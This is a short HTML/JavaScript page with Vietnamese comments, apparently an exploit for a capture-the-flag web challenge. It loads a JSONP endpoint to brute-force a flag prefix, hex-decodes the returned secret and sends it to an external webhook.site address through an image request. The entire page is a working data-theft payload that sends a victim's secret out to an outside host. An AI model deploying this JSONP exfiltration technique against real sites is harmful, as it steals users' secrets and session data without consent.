<!DOCTYPE html>
<html><body>
<script>
function handleFlag(data) {
  // data trả về từ server dưới dạng JSONP callback
  // Giả sử data có cấu trúc giống cookie.best (hex prefix + note)
  let val = data.best || '';
  let flag = '';
  if (val) {
    const [hexP] = val.split(':');
    flag = hexP.match(/.{1,2}/g).map(h=>String.fromCharCode(parseInt(h,16))).join('');
  }
  // Gửi flag ra ngoài
  new Image().src = 'http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(flag);
}

// Tạo thẻ script để gọi JSONP
const script = document.createElement('script');
const guess = encodeURIComponent('NHNC{'); // Thay dần prefix ở đây khi brute-force
const note = encodeURIComponent('');
script.src = `/guess?guess=${guess}&note=${note}&callback=handleFlag`;
document.head.appendChild(script);
</script>
</body></html>
